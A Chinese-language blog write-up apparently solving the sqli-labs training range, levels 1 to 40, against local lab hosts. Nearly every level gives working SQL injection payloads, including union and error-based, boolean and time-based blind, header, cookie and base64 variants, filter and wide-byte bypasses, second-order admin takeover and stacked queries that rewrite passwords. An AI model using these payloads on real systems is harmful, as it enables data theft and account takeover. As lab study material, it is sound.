---
# 当前页面内容标题
title: sqli-labs 闯关
# sidebar: heading
# 当前页面图标
icon: note
# 分类
category:
    - 日常
tag:
    - 靶场
    - sql注入
sticky: false
# 是否收藏在博客主题的文章列表中，当填入数字时，数字越大，排名越靠前。
star: false
# 是否将该文章添加至文章列表中
article: true
# 是否将该文章添加至时间线中
timeline: true
# sidebar: heading
date: 2023-02-16
# 浏览量
pageview: true
---

# Sqli-labs

**地址：**：http://127.0.0.1:8080/sqli-labs

## 第一关

![image-20220921002340922](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921002340922.png)

查询注入：

首先使用`2'%23`尝试注入

```
http://127.0.0.1:8080/sqli-labs/Less-1/?id=2'%23
```

![image-20220921003141236](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921003141236.png)

回显正常，说明可能存在注入漏洞，使用order by 获取列数

```
http://127.0.0.1:8080/sqli-labs/Less-1/?id=2' order by 4%23
1-3正常显示，4报错，说明只有3列
```

使用union获取数据库名称

```sh
http://127.0.0.1:8080/sqli-labs/Less-1/?id=2' union select 1,database(),3 limit 1,2%23
```

![image-20220921002955239](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921002955239.png)

报错注入：

1. 尝试是否可以报错注入

   ```
   http://127.0.0.1:8080/sqli-labs/Less-1/?id=2'and 1=1%23
   回显正常，可以注入
   ```

   ![image-20220921002633528](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921002633528.png)

2. 开始注入

   ```
   http://127.0.0.1:8080/sqli-labs/Less-1/?id=2' and updatexml(1,concat(0x7e,database(),0x7e),1)%23
   ```

3. 成功

   ![image-20220921002756913](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921002756913.png)

## 第二关

首先使用`2'%23`尝试注入

```
http://127.0.0.1:8080/sqli-labs/Less-2?id=2'%23
```

![image-20220921003451878](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921003451878.png)

去除`'`使用`%20and%201=1%23`尝试注入

```
http://127.0.0.1:8080/sqli-labs/Less-2/?id=1%20and%201=1%23
```

报错注入

```
http://127.0.0.1:8080/sqli-labs/Less-2/?id=1%20and%20updatexml(1,concat(0x7e,database(),0x7e),1)%23
```

![image-20220921004427442](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921004427442.png)

## 第三关

尝试`')and 1=1%23`

```
http://127.0.0.1:8080/sqli-labs/Less-3/?id=1')and 1=1%23
```

![image-20220921004921480](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921004921480.png)

尝试`')and 1=2%23`

![image-20220921004951577](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921004951577.png)

尝试`') union select 1,database(),3 limit 1,2 --+`

```
http://127.0.0.1:8080/sqli-labs/Less-3/?id=1') union select 1,database(),3 limit 1,2 --+
```

![image-20220921005228961](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921005228961.png)

## 第四关

尝试`'`、`')`、`")`，`")`触发报错信息

![image-20220921005620862](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921005620862.png)

尝试`")and 1=2--+`，无显示，说明有注入漏洞

![image-20220921005720654](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921005720654.png)

使用`") union select 1,database(),3 limit 1,2--+`进行注入

```
http://127.0.0.1:8080/sqli-labs/Less-4/?id=1") union select 1,database(),3 limit 1,2--+
```

![image-20220921005902878](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921005902878.png)

## 第五关

尝试使用`'`，`"`获取报错信息

```
http://127.0.0.1:8080/sqli-labs/Less-5?id=1')
```

![image-20220921010804038](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921010804038.png)

发现三个单引号，尝试使用`'and 1=2--+`，发现注入漏洞

![image-20220921010847230](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921010847230.png)

开始注入

```
http://127.0.0.1:8080/sqli-labs/Less-5?id=1' and updatexml(1,concat(0x7e,database(),0x7e),1)--+
```

![image-20220921011044408](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921011044408.png)

## 第六关

尝试`id=1"`（单引号到双引号😂），查找漏洞

```
http://127.0.0.1:8080/sqli-labs/Less-6?id=1"
```

![image-20220921011136429](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921011136429.png)

开始注入（第四题的单引号变双引号）

![image-20220921011359978](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921011359978.png)

## 第七关

尝试`'`，获取报错信息

![image-20220921012547956](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921012547956.png)

发现`'))and 1=1 --+`，添加注释尝试注入

![image-20220921012705231](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921012705231.png)

获取列数

![image-20220921012504522](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921012504522.png)

使用盲注，发现无论是正确的还是错误的都是680字节长

![image-20220921015614158](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921015614158.png)

![image-20220921015650495](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921015650495.png)

决定使用文本过滤

![image-20220921015944960](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921015944960.png)

执行python代码

![image-20220921020414634](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921020414634.png)

## 第八关

尝试`'and 1=1--+`和`'and 1=2--+`

![image-20220921091236279](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921091236279.png)

![image-20220921091247884](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921091247884.png)

发现可以盲注，且正确响应和非正确的响应长度不同

获取长度: http://127.0.0.1:8080/sqli-labs/Less-8/?id=2'and length(database())=*_*--+

获取database()：http://127.0.0.1:8080/sqli-labs/Less-8/?id=2'and substr(database(),1,1)=%27*_*%27--+

![image-20220921091514424](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921091514424.png)

## 第九关

发现无论输入什么都无法返回任何报错信息

尝试使用时间盲注

获取长度：http://127.0.0.1:8080/sqli-labs/Less-9/?id=1' and if(length(database())=*_*,sleep(1),1)--+

获取名称：http://127.0.0.1:8080/sqli-labs/Less-9/?id=1' and if(substr(database(),1,1)=%27*_*%27,sleep(1),1)--+

![image-20220921093932316](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921093932316.png)

## 第十关

尝试触发报错，均无法触发回显

```
',",--+,#,%2d%2d%20,id=
```

![image-20220921094940697](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921094940697.png)

尝试使用时间报错，成功延迟2秒

```
http://127.0.0.1:8080/sqli-labs/Less-10?id=2"and if(1=1,sleep(2),1)--+
```

![image-20220921095440950](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921095440950.png)

尝试使用database()不等于1，延迟1秒，成功

```
http://127.0.0.1:8080/sqli-labs/Less-10?id=2"and if(length(database())!=1,sleep(1),1)--+
```

![image-20220921095905709](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921095905709.png)

开始注入：

database()长度：http://127.0.0.1:8080/sqli-labs/Less-10?id=2"and if(length(database())!=*_*,sleep(1),1)--+

database()名称：http://127.0.0.1:8080/sqli-labs/Less-10?id=2"and if(substr(database(),1,1)='*_*',sleep(1),1)--+

![image-20220921100259696](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921100259696.png)

## 第十一关

使用aaa’进行尝试，返回报错信息

![image-20220921101524976](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921101524976.png)

经过尝试，服务器返回两个字段

![image-20220921102015601](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921102015601.png)

尝试查询注入

```a' union select 1,2 limit 0,1 #
a' union select 1,2 limit 0,1 #
```

![image-20220921102131504](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921102131504.png)

开始注入

```
a' union select 1,database() limit 0,1 #
```



![image-20220921102201977](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921102201977.png)

## 第十二关

尝试使用`"`进行试探，发现password使用"")进行包裹

![image-20220921102816128](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921102816128.png)

尝试使用下面的语句进行试探，发现没有回显信息，说明下面的语句合法

```
"")and 1=1 limit 0,1--+
```

![image-20220921102716076](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921102716076.png)

尝试使用order by获取字段数量，判断为2，3报错

```
sdf"'') order by 3 limit 0,1#
```

![image-20220921104117246](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921104117246.png)

使用查询注入，成功

```sh
sdf"'') union select 1,database() limit 0,1#
```

![image-20220921104249130](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921104249130.png)

## 第十三关

尝试`'`

![image-20220921104437306](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921104437306.png)

获取信息：r '''') and password=('') LIMIT 0,1' 

尝试获取查询表的字段，字段还是2

```
as')order by 3 limit 0,1#
```

![image-20220921104617354](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921104617354.png)

还是可以使用查询注入

```
as')union select 1,2 limit 0,1#
```

![image-20220921114713834](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921114713834.png)

无任何回显，使用报错注入，注入成功

```
as')and updatexml(1,concat(0x7e,database(),0x7e),1) limit 0,1#
```

![image-20220921115015206](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921115015206.png)

## 第十四关

使用`"`，尝试错误

![image-20220921115328314](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921115328314.png)

尝试`""order by 5 limit 0,1%23`，无报错信息

![image-20220921115458397](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921115458397.png)

继续尝试

```
uname='&passwd="and updatexml(1,concat(0x7e,database(),0x7e),1) limit 0,1#&submit=Submit
```

注入成功

![image-20220921130002392](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921130002392.png)

## 第十五关

尝试获取报错信息，失败，无法获取任何报错信息

```
' " ') --+ %23 
```

![image-20220921130510957](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921130510957.png)

尝试进行盲注

```
"and if(1=1,sleep(2),1)# 失败
%27and if(1=1,sleep(2),1)%23 失败
'and if(1=1,sleep(2),1)%23 失败
%22and if(1=1,sleep(2),1)%23 失败
')and if(1=1,sleep(2),1)%23 失败
")and if(1=1,sleep(2),1)%23 失败
")and if(1=1,sleep(2),1)%23 失败
....看原代码
```

![image-20220921133354183](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921133354183.png)

sql没有进行任何处理，按理来说`'and if(1=1,sleep(2),1)%23`这个应该没有问题啊？🤔

继续尝试一番后发现将and换成or，可以执行，但是因为是or所以select没查询一条，就sleep一次，这个时候要么使用正常的账号名称再在里面加上注入语句，要么将休眠的时间改小，我这里改0.1秒，查完后是1.3秒，所以使用改休眠时间的方法

获取长度（注意python的json.loads()不能用‘包裹字段和值）

```
{
"uname":"%27or if(length(database())=*_*,sleep(0.1),1) limit 0,1%23",
"passwd":"ss",
"submit":"Submit"
}
```

获取数据库名字

```
{
"uname":"%27or if(substr(database(),1,1)=%27*_*%27,sleep(0.1),1) limit 0,1%23",
"passwd":"ss",
"submit":"Submit"
}
```

因为是post请求，所以需要修改脚本，将之前的self.sql_test当成参数

```python
from urllib.parse import unquote
import json
# 对请求里的url编码进行解码
text = unquote(url.replace("*_*", str(i)), 'utf-8')
# 然后将text转化为json文件，发送给服务器
json.loads(text)
```

![image-20220921144015672](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921144015672.png)

## 第十六关

![image-20220921172505349](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921172505349.png)

根据这个描述，可以知道使用基于报错的盲注，所以一开始尝试获取成功的信息

```
uname=%22)or 1=1%23&passwd='s'&submit=Submit
```

成功：长度为1504

![image-20220921172704857](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921172704857.png)

报错：长度为1467

![image-20220921172726914](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921172726914.png)

修改python代码，获取请求响应内容的长度

![image-20220921173110551](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921173110551.png)

再把成功的长度写死在代码里

![image-20220921173643772](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921173643772.png)

因为是POST请求所以需要设计JSON

1. 获取database()的长度，不要有单引号

   ```json
   {
   "uname":"\") or (length(database())=*_*)%23",
   "passwd":"s",
   "submit":"Submit"
   }
   ```

2. 获取database()的名字

   ```json
   {
   "uname":"\")or (substr(database(),1,1)=\"*_*\")%23",
   "passwd":"s",
   "submit":"Submit"
   }
   ```

   ![image-20220921190606664](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921190606664.png)

## 第十七关

标题是基于update的报错注入，`or updatexml(1,concat(0x7e,database(),0x73),1)`

```
1、uname=aa&passwd=ss'or updatexml(1,concat(0x7e,database(),0x73),1) or'&submit=Submit
失败
2、uname=aa&passwd=ss"or updatexml(1,concat(0x7e,database(),0x73),1) or"&submit=Submit
失败
3、uname=aa&passwd=ss%22or updatexml(1,concat(0x7e,database(),0x73),1) or%22&submit=Submit
失败。。。逻辑不通，看源代码
```

![image-20220921193014564](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921193014564.png)

并且对uname进行防注入

![image-20220921195550481](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921195550481.png)

上网看了教程，都说是无法对username进行注入，所以需要一个正确的username！所以第一步需要获取username

虽然username进行了防注入处理，但是没有防爆破，和没有对password进行防注入处理，所以接下来对这两点进行攻击

第一步：爆破获取username

![image-20220921220232732](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921220232732.png)

第二部：对password进行报错注入

username：admin

password: 'or updatexml(1,concat(0x7e,database(),0x7e),1) or'

![image-20220921220431631](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921220431631.png)

## 第十八关

第十八关需要进行头部注入，尝试以下代码

```sh
'or updatexml(1,concat(0x7e,database(),0x7e),1) or'
```

![image-20220921221708981](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921221708981.png)

无论怎么加都没办法触发报错，还是查看原代码吧！

![image-20220921221744780](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921221744780.png)

上图可以看到，原来一开始的这个IP是在session里拿到的🙂，这是真的不看不知道

![image-20220921223142343](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921223142343.png)

这下子完蛋，用户和密码也给防注入了！！

![image-20220921223437549](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921223437549.png)

然后根据上图，发现登录成功后会服务器会对agent进行插入并且agent没有设置任何防护

所以第一步是获取用户名和密码，这里选择爆破的方式进行

![image-20220921224303079](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921224303079.png)

发现0000和其他的密码长度不同

![image-20220921224335195](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921224335195.png)

尝试登录

![image-20220921224438070](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921224438070.png)

开始头部注入

![image-20220921224538978](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921224538978.png)

![image-20220921224554858](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921224554858.png)

l两边加上`'`再试，成功

![image-20220921224646805](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921224646805.png)

第十九关

![image-20220921224753049](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921224753049.png)

这里提示referer field，所以输入账号和密码，任何尝试注入

```
'or updatexml(1,concat(0x7e,database(),0x7e),1) or'
```

![image-20220921225048623](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921225048623.png)

直接成功

## 第二十关

考验的是cookie注入，可以看到字段为uagent field

![image-20220921225207459](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921225207459.png)

登录后

![image-20220921225330857](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921225330857.png)

登录时使用Burp Suite对请求进行拦截

第一次只有账号和密码，放过去

![image-20220921230442464](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921230442464.png)

第二次，传输了一个cookie

![image-20220921230634774](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921230634774.png)

对uname=admin进行注入

```
'or updatexml(1,concat(0x7e,database(),0x7e),1) or'
```

注入成功

![image-20220921230308382](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921230308382.png)

## 第二十一关

![image-20220921230816753](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921230816753.png)

这个需要进行木马注入，首先确定权限

![image-20220921231850969](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921231850969.png)

secure_file_priv = NULL 表示可读可写

现在在20关的基础上对payload进行修改

```
'or updatexml(1,concat(0x7e,database(),0x7e),1) or'
```

失败！！！查看原代码吧

代码依然对username和password进行了防护

![image-20220921233322423](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921233322423.png)

在设置cookie时的代码，发现其使用了base64进行加密

![image-20220921233517499](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921233517499.png)

在加密后，并登录成功，会重新获取cookie，并对其进行base64解密，所以可以判断这里是可以进行注入的

![image-20220921233815473](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921233815473.png)

设计payload，经过多次重送，确定查询列数为3行

```
')order by 3 limit 0,1--+ base64转码 JylvcmRlciBieSAzIGxpbWl0IDAsMSM=
```

![image-20220921234101160](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921234101160.png)

![image-20220921234243895](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220921234243895.png)

尝试查询注入，成功（load_file无回显，upload报错）

```
')union select 1,3,database() limit 0,1# base64转换 Jyl1bmlvbiBzZWxlY3QgMSwzLGRhdGFiYXNlKCkgbGltaXQgMCwxIw==
```

![image-20220922000259600](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220922000259600.png)

## 第二十二关

使用burp进行代理抓包，发现其依然使用base64进行加密传输cookie值

![image-20220922000714646](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220922000714646.png)



一番尝试无果后，决定查看源码

![image-20220922002129128](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220922002129128.png)

就加了一个双引号😥怪我没有再多尝试

```
"or updatexml(1,concat(0x7e,database(),0x7e),1) or"
base64转码
Im9yIHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLGRhdGFiYXNlKCksMHg3ZSksMSkgb3Ii
```

![image-20220922002305479](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220922002305479.png)

## 第二十三关

![image-20220922003517360](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220922003517360.png)

尝试使用--+和#发现被过滤了,尝试使用报错注入

```
1'and updatexml(1,concat(0x7e,database(),0x7e),1) and'
```

![image-20220922005601953](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220922005601953.png)

## 第二十四关

这里使用二次注入，创建一个admin'#的用户，然后通过修改这个用户的密码，从而间接的修改了admin的密码

![image-20220922011304650](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220922011304650.png)

登录成功

![image-20220922011512433](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220922011512433.png)

修改密码，修改密码为qwe

![image-20220922011532920](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220922011532920.png)

尝试使用qwe登录admin，登录成功

![image-20220922011611813](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220922011611813.png)

![image-20220922011618207](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220922011618207.png)

## 第二十五关

提示的很明显，会对payload里or和and进行过滤

![image-20220922011957793](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220922011957793.png)

尝试使用：`?id=1' anandd 1=1--+`进行绕过，成功

![image-20220922012203628](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220922012203628.png)

查询注入

```
id=1' union select 1,database(),3 limit 1,2--+
```

![image-20220922012438953](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220922012438953.png)

报错注入

```
id=1' anandd updatexml(1,concat(0x7e,database(),0x7e),1) limit 1,2--+
```

![image-20220922012533986](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220922012533986.png)

## 第二十六关

![image-20220922012657146](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220922012657146.png)

大致意思是所有的空格和一些命令都无法使用

先尝试`'`

![image-20220922012825944](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220922012825944.png)

尝试()绕过空格

```
id=1'anandd(1=1)oorr'
```

![image-20220922013808380](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220922013808380.png)

报错注入

```
d=1'anandd(updatexml(1,concat(0x7e,database(),0x7e),1))oorr'
```

![image-20220922013915022](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220922013915022.png)

## 第二十七关

![image-20220922014031462](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220922014031462.png)

在之前的基础上select和union无法使用，但是or和and被解放了，注释被过滤了

这里尝试使用`?id=1'and(1=1)and'`进行注入，没有保存，方法可行

![image-20220922014930446](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220922014930446.png)

报错注入，成功

```
updatexml(1,concat(0x7e,database(),0x7e),1)
```

![image-20220922014957410](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220922014957410.png)

## 第二十八关

![image-20220922015320722](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220922015320722.png)

尝试`id=1'and/**/'2'='1`,/**/代替空格

![image-20220922020025940](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220922020025940.png)

布尔注入

关键在于内容长度的变化

在获取数据库名称长度时，正确的内容长度为932

在获取数据库名称时，正确内容的长度为938

![image-20220922024526826](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220922024526826.png)

## 第二十九关

一次就过了😂，不知道写啥

```
id=1'and(updatexml(1,concat(0x7e,database(),0x7e),1))or'
```

![](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220922085550432.png)

## 第三十关

尝试`id=1'and(1=1)'`，失败

尝试`id=1"and(1=1)or"` 代码运行正常，等于-1，没有结果，等于一有结果，可以进行盲注

![image-20220922085921832](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220922085921832.png)

获取database()长度

```
http://192.168.235.152/sqli-labs/Less-30?id=1"and(if(length(database())=*_*,sleep(1),1))or"
```

获取database()名称

```
http://192.168.235.152/sqli-labs/Less-30?id=1"and(if(substr(database(),1,1)='*_*',sleep(1),1))or"
```

![image-20220922102000900](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220922102000900.png)

![image-20220922101946367](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220922101946367.png)

## 第三十一关

尝试`1"and 1=1 or"`

![image-20220922102546505](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220922102546505.png)

尝试`1"and 1=2 or"`

![image-20220922102601032](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220922102601032.png)

获取database()长度

```
http://192.168.235.152/sqli-labs/Less-31?id=1"and (if(length(database())=*_*,sleep(0.1),1)) and"
```

获取database()名称

```
http://192.168.235.152/sqli-labs/Less-31?id=1"and (if(substr(database(),1,1)='*_*',sleep(0.1),1)) and"
```

![image-20220922103647039](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220922103647039.png)

## 第三十二关

使用宽字节注入%df'使\失效

![image-20220922113102789](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220922113102789.png)

## 第三十三关

同三十二关一样

![image-20220922113503078](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220922113503078.png)

## 第三十四关

使用%df'对post进行注入

```
uname=%df' union select database(),2-- 
&passwd=
&submit=Submit
```

![image-20220922115211792](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220922115211792.png)

## 第三十五关

直接写

```
id=1 and updatexml(1,concat(0x7e,database(),0x7e),1)
```

![image-20220922115951075](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220922115951075.png)

## 第三十六关

```
1%df' and updatexml(1,concat(0x7e,database(),0x7e),1)--+
```

![image-20220922120557735](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220922120557735.png)

## 第三十七关

```
uname=%df' union select database(),2 limit 0,1-- 
&passwd=
&submit=Submit
```

![image-20220922120847455](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220922120847455.png)

## 第三十八关

```
id=1%df'and updatexml(1,concat(0x7e,database(),0x7e),1)--+
```

![image-20220922121052920](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220922121052920.png)

## 第三十九关

这关没有任何防御措施

```
?id=9%20and(1=1)limit%200,1--+
```

![image-20220924090650093](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220924090650093.png)

但题目要求堆叠查询注入，所以首先使用查询注入获取表名

```
SELECT GROUP_CONCAT(CONCAT_WS(" * ",a.TABLE_NAME) SEPARATOR ' ') from (select Distinct TABLE_NAME from information_schema.`COLUMNS` WHERE TABLE_SCHEMA=database()) as a
```

![image-20220924093422097](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220924093422097.png)

获取user表字段

```
SELECT GROUP_CONCAT(CONCAT_WS(" * ",a.COLUMN_NAME) SEPARATOR ' ') from (select Distinct COLUMN_NAME from information_schema.`COLUMNS` WHERE table_name = 'users' and table_schema='security') as a
```

![image-20220924093821321](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220924093821321.png)

使用堆叠注入将id=9的用户密码进行修改

```
http://192.168.235.152/sqli-labs/Less-39/?id=9%20limit%200,1;update%20users%20set%20password=%27123%27%20where%20id=9--+
```

![image-20220924093943621](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220924093943621.png)

修改成功

## 第四十关

尝试拼接正确的payload失败，看源代码，发现加了个括号

![image-20220924095057523](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220924095057523.png)

```
http://192.168.235.152/sqli-labs/Less-40?id=1'and(1=1)or'--
```

堆叠注入

```
http://192.168.235.152/sqli-labs/Less-40?id=1')and(1=1)limit 0,1;update users set password=456 where id=1--+
```

![image-20220924095308686](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220924095308686.png)

## 第四十一关

